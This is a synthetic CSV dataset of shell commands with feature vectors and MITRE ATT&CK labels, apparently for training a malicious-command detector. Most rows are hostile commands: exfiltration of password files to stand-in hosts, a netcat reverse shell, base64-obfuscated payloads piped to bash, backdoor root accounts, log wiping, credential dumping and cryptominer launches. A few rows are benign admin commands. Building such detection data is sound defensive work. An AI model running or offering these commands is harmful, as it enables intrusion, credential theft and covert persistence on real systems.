command,features,label,source
cat /etc/shadow | nc 10.0.0.99 4444,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
echo '@reboot /tmp/backdoor.sh' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1053_Scheduled_Task'],synthetic
time echo 'Y3VybCAtQSAnTW96aWxsYS81LjAnIGh0dHA6Ly9jMi5hdHRhY2tlci5jb20vY2hlY2staW4=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1071_Application_Layer_Protocol', 'T1027_Obfuscated_Files_or_Information']",synthetic
time pwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
echo 'bHNjcHUgOyBjaG1vZCAreCAvdG1wL3BheWxvYWQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo  'Li9DVkUtMjAyMS00MDM0'  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1027_Obfuscated_Files_or_Information']",synthetic
pip  install  requests,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
"python3  -c  ""exec(__import__('base64').b64decode('aW1wb3J0IG9z').decode())""  |  echo  done","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wget --post-file=/etc/passwd http://attacker.com/receive,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
sudo echo 'ZWNobyAtZSAnXHgyZlx4NjJceDY5XHg2ZVx4MmZceDYyXHg2MVx4NzNceDY4Jw==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
find / -perm -4000 -type f 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
shred -u /var/log/auth.log && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter']",synthetic
./pwnkit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
ncrack -p 22 --user root -P pass.lst 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1110_Brute_Force'],synthetic
"bash -c ""./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash'""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
nc -e /bin/bash attacker.com 80,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
journalctl -u ssh --since today,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
useradd -m -s /bin/bash -G sudo newadmin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1098_Account_Manipulation'],synthetic
sudo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.52, 0, 0]",['T1136_Create_Account'],synthetic
uname -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
nohup find / -name '*.conf' -readable 2>/dev/null | head -20 &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.44, 1, 0]",['T1083_File_and_Directory_Discovery'],synthetic
"bash -c ""echo 'bWltaWthdHouZXhlICdzZWt1cmxzYTo6bG9nb25wYXNzd29yZHMnIGV4aXQgOyBjaG1vZCAreCAvdG1wL3BheWxvYWQ=' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
sed -i 's/old/new/g' config.cfg,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
wget --post-file=/etc/passwd http://attacker.com/receive,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
"runuser -l postgres -c 'psql -c ""SELECT pg_read_file(\'/etc/passwd\')""'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1078_Valid_Accounts'],synthetic
passwd -d root,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1098_Account_Manipulation'],synthetic
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost | > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.64, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
id -Gn,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
time find /home -name '*.conf',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
"bash -c ""echo 'Y2F0IC9ldGMvc2hhZG93IHwgbmMgMTAuMC4wLjk5IDQ0NDQ=' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1027_Obfuscated_Files_or_Information']",synthetic
service  apache2  status,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
getent  group  sudo,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
"bash -c ""ifconfig -a""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
"perl -e 'eval pack q/H*/, q/7363726970742e6570732f52656d6f74652e706e67/'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
nohup nmap -sV --version-intensity 5 -p 1-65535 10.0.0.1 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.36, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
ip link show && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time nmap -A -T4 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
cat /etc/os-release | echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'aXAgcm91dGUgc2hvdw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
time usermod -aG sudo compromised_user,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1098_Account_Manipulation'],synthetic
echo  'aGVsbG8='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
echo 'c2hyZWQgLXUgL3Zhci9sb2cvYXV0aC5sb2cgfCBjaG1vZCAreCAvdG1wL3BheWxvYWQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
find /home -name '*.conf',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
sudo echo 'Y2F0IC9ldGMvbmV0d29yay9pbnRlcmZhY2VzIHwgaGlzdG9yeSAtYw==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'cmVnIGRlbGV0ZSBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBEZWZlbmRlcg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
"nmap -sV -p 22,80,443 10.0.0.0/24","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
echo 'aXAgcm91dGUgc2hvdyAmJiBoaXN0b3J5IC1j' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
time echo 'dGZ0cCAtaSAxMC4wLjAuOTkgR0VUIHBheWxvYWQuZXhlIEM6XFdpbmRvd3NcVGVtcFxwYXlsb2FkLmV4ZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
time echo 'bm1hcCAtc1YgLS12ZXJzaW9uLWludGVuc2l0eSA1IC1wIDEtNjU1MzUgMTAuMC4wLjE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1046_Network_Service_Scanning', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""nmap -sV -p 22,80,443 10.0.0.0/24""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
nohup nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet & &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1496_Resource_Hijacking'],synthetic
nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1496_Resource_Hijacking'],synthetic
echo 'c3lzdGVtY3RsIGVuYWJsZSAtLW5vdyBtYWxpY2lvdXMuc2VydmljZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
time wmic useraccount list ; history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time echo 'cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zOy4uLic=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
procdump.exe -ma lsass.exe lsass.dmp,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
su  -  admin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1078_Valid_Accounts'],synthetic
cat /etc/passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1087_Account_Discovery'],synthetic
./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash' | > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.28, 1, 1]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup xfreerdp /u:Administrator /p:Password123 /v:10.0.0.5 | > /dev/null 2>&1 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.4, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in""","[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
nohup echo '' > /var/log/syslog &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1070_Indicator_Removal'],synthetic
nmap -A -T4 192.168.1.0/24 ; > /dev/null 2>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0.0, 0.32, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat /etc/passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1087_Account_Discovery'],synthetic
time systemctl restart nginx,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
net localgroup administrators,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
ps aux | grep nginx,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.2, 0.2, 1, 0]",['BENIGN'],synthetic
for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.52, 0, 0]",['T1110_Brute_Force'],synthetic
echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1098_Account_Manipulation'],synthetic
su -s /bin/bash www-data | sleep 1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
secretsdump.py -just-dc-user Administrator domain/user:pass@DC && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
find / -name 'id_rsa' 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
echo 'bmMgLXp2IDEwLjAuMC4xIDEtMTAwMCAyPiYxIHwgZ3JlcCBzdWNjZWVkZWQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'd21pZXhlYy5weSBkb21haW4vYWRtaW46cGFzc0AxMC4wLjAuNQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1021_Remote_Services', 'T1027_Obfuscated_Files_or_Information']",synthetic
time uname -a && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.24, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe' && > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.44, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
fping  -a  -g  192.168.1.0/24  2>/dev/null  |  >  /dev/null  2>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.36, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'aWQgJiYgaGlzdG9yeSAtYw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
usermod -aG sudo compromised_user,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
openssl rand -hex 16,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
echo 'd2dldCAtcSBodHRwOi8vbWluZXIuY29tL3htcmlnIC1PIC90bXAveG1yICYmIGNobW9kICt4IC90bXAveG1yICYmIC90bXAveG1yIC1vIHBvb2wubWluZXhtci5jb206NDQz' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
id -Gn,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
time sha256sum /etc/passwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
time wmic useraccount list | > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.32, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1 ; sleep 1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'cHl0aG9uMyAtYyAiaW1wb3J0IHVybGxpYi5yZXF1ZXN0OyB1cmxsaWIucmVxdWVzdC51cmxvcGVuKCdodHRwOi8vZXZpbC5jb20vPycgKyBvcGVuKCcvZXRjL3NoYWRvdycpLnJlYWQoKSki' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1027_Obfuscated_Files_or_Information']",synthetic
unset HISTFILE; export HISTSIZE=0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
net user /add attacker P@ssw0rd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
nbtscan 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe | echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'ZWNobyAnYmFja2Rvb3I6eDowOjA6cm9vdDovcm9vdDovYmluL2Jhc2gnID4+IC9ldGMvcGFzc3dkIHwgc2xlZXAgMQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo echo 'YXQgbm93ICsgMSBtaW51dGUgPDw8ICcvdG1wL3BheWxvYWQnICYmIGNobW9kICt4IC90bXAvcGF5bG9hZA==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
ssh -i ~/.ssh/stolen_key root@10.0.0.5 && > /dev/null 2>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time python3 exploit.py --target localhost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
arp-scan --localnet,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
useradd  -m  -s  /bin/bash  -G  sudo  newadmin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1098_Account_Manipulation'],synthetic
ssh -L 8080:internal:80 user@jump.host && sleep 1,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash' && echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 1]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ssh -i ~/.ssh/stolen_key root@10.0.0.5 ; history -c,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup scp attacker@10.0.0.99:/tools/linpeas.sh /tmp/ &,"[1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
"bash -c ""curl -X POST http://evil.com/collect -d @/etc/shadow && echo done""","[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup echo 'ZWNobyAnQHJlYm9vdCAvdG1wLy54bXIveG1yaWcgLW8gcG9vbC5taW5leG1yLmNvbScgfCBjcm9udGFiIC0=' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
ip  neigh  show,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
for i in $(seq 1 254); do ping -c1 -W1 192.168.0.$i &>/dev/null && echo 192.168.0.$i; done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.64, 1, 0]",['T1018_Remote_System_Discovery'],synthetic
sudo nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded,"[1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
nohup procdump.exe -ma lsass.exe lsass.dmp | chmod +x /tmp/payload &,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 1]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
getent passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
"ldapsearch -x -b 'dc=domain,dc=com' '(objectClass=person)'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1087_Account_Discovery'],synthetic
nohup hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1 && chmod +x /tmp/payload &,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 1, 1]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
Get-LocalGroupMember -Group Administrators,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
time echo 'dW5zZXQgSElTVEZJTEU7IGV4cG9ydCBISVNUU0laRT0w' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
journalctl -u ssh --since today,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
cat /etc/passwd | grep -v nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1003_OS_Credential_Dumping'],synthetic
